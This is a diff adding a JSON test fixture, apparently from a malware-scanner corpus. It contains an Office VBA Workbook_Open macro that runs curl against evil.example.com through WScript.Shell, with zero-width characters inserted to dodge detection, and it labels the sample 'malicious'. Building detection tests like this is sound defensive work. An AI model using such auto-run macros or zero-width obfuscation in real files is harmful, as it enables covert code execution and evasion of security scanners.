@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::62::unicode-variations::3",
+  "base_sample_id": "exp::document-office::62",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -1535930521,
+  "content": "Private Sub Workbook_Ope‍n()‍\n‍  CreateObject(\"WScri​pt.Shell\").​Run \"c‌ur​l http://⁠evil​.exampl​e.com/\"\nEnd ‍Sub\n",
+  "content_hash": "e2ecefc5e5b9bcba8a9db1f3ed6cd4f3f02218255587a04067ab1139309dae48",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
